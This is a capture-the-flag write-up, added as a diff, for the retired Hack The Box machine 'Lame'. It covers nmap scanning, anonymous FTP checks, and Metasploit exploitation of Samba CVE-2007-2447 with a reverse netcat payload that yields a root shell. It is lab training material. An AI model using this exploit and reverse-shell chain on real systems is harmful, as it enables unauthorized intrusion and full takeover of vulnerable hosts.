@@ -1,0 +1,148 @@
+#HackTheBox
+#RetiredBox
+#Lame
+
+Let's scan this machine.
+
+	kali@kali:~/CTF/HTB/Machines/Lame$ sudo nmap -sV -A -T4 -O -Pn 10.10.10.3
+	Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-03 22:13 EST
+	Nmap scan report for 10.10.10.3
+	Host is up (0.12s latency).
+	Not shown: 996 filtered ports
+	PORT    STATE SERVICE     VERSION
+	21/tcp  open  ftp         vsftpd 2.3.4
+	|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| ftp-syst: 
+	|   STAT: 
+	| FTP server status:
+	|      Connected to 10.10.14.4
+	|      Logged in as ftp
+	|      TYPE: ASCII
+	|      No session bandwidth limit
+	|      Session timeout in seconds is 300
+	|      Control connection is plain text
+	|      Data connections will be plain text
+	|      vsFTPd 2.3.4 - secure, fast, stable
+	|_End of status
+	22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	| ssh-hostkey: 
+	|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+	|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+	Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
+	No exact OS matches for host (test conditions non-ideal).
+	Network Distance: 2 hops
+	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Host script results:
+	|_clock-skew: mean: 2h44m44s, deviation: 3h32m10s, median: 14m42s
+	| smb-os-discovery: 
+	|   OS: Unix (Samba 3.0.20-Debian)
+	|   Computer name: lame
+	|   NetBIOS computer name: 
+	|   Domain name: hackthebox.gr
+	|   FQDN: lame.hackthebox.gr
+	|_  System time: 2021-02-03T22:29:12-05:00
+	| smb-security-mode: 
+	|   account_used: <blank>
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	|_smb2-time: Protocol negotiation failed (SMB2)
+
+	TRACEROUTE (using port 445/tcp)
+	HOP RTT       ADDRESS
+	1   113.48 ms 10.10.14.1
+	2   113.30 ms 10.10.10.3
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 92.79 seconds
+
+We've got an ftp server running on port 21 with anonymous login allowed, an ssh server running on port 22, and two versions of samba smbd running on ports 139 and 445. The box is most likely running Ubuntu.
+
+Let's test the ftp server first logging in anonymously.
+
+	kali@kali:~/CTF/HTB/Machines/Lame$ pftp 10.10.10.3 
+	Connected to 10.10.10.3.
+	220 (vsFTPd 2.3.4)
+	Name (10.10.10.3:kali): anonymous
+	331 Please specify the password.
+	Password:
+	230 Login successful.
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> ls -lat
+	227 Entering Passive Mode (10,10,10,3,29,187).
+	150 Here comes the directory listing.
+	drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+	drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+	226 Directory send OK.
+	ftp> cd ..
+	250 Directory successfully changed.
+	ftp> ls -lat
+	227 Entering Passive Mode (10,10,10,3,80,233).
+	150 Here comes the directory listing.
+	drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+	drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+	226 Directory send OK.
+	ftp> pwd
+	257 "/"
+	ftp> exit
+	221 Goodbye.
+
+Note: I had to run pftp instead of ftp to enter passive mode, as I could not list directories when I attempted using ftp.
+
+It seems the ftp directory is empty. The ftp is probably a rabbit hole. Without users or passwords, ssh is an unlikely target. It seems samba is the way to go.
+
+Searching for samba exploits on searchsploit I have found a command execution vulnerability for the Samba version running on this box: CVE-2447. (see https://cvedetails.com/cve/CVE-2007-2447/). There's a metasploit exploit we can use for this, exploit/multi/samba/usermap_script.
+
+All we have to do is setup a payload, or use the default netcat payload, set RHOSTS, LHOSTS and LPORT. 
+
+	msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+	RHOSTS => 10.10.10.3
+	msf5 exploit(multi/samba/usermap_script) > 
+	msf5 exploit(multi/samba/usermap_script) > show options 
+
+	Module options (exploit/multi/samba/usermap_script):
+
+	   Name    Current Setting  Required  Description
+	   ----    ---------------  --------  -----------
+	   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+	   RPORT   139              yes       The target port (TCP)
+
+
+	Payload options (cmd/unix/reverse_netcat):
+
+	   Name   Current Setting  Required  Description
+	   ----   ---------------  --------  -----------
+	   LHOST  192.168.1.72     yes       The listen address (an interface may be specified)
+	   LPORT  4444             yes       The listen port
+
+
+	Exploit target:
+
+	   Id  Name
+	   --  ----
+	   0   Automatic
+
+
+	msf5 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.4
+	LHOST => 10.10.14.4
+	msf5 exploit(multi/samba/usermap_script) > 
+	msf5 exploit(multi/samba/usermap_script) > run
+
+	[*] Started reverse TCP handler on 10.10.14.4:4444 
+	[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:44130) at 2021-02-04 03:00:50 -0500
+
+	id
+	uid=0(root) gid=0(root)
+	whoami
+	root
+	hostname
+	lame
+
+All we have to do now is move to the user and root directories and look for the flags in the Desktop folders. The machine user seems to be makis, we can find the user flag on their Desktop folder.
+
+
